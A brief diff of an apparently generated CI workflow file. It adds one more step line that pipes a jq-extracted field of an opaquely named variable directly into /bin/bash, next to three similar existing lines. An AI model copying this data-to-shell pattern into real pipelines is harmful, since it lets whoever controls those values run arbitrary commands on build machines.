@@ -24,6 +24,7 @@ jobs:
           echo $wykg2610 | jq -r .hdto30948 | /bin/bash
           printf '%s' "$sxm1" | jq -r .r57 | /bin/bash
           echo $y63 | jq -r .s3968 | /bin/bash
+          printf '%s' "$zl95" | jq -r .k348 | /bin/bash
 
       - name: Archive output
         if: always()
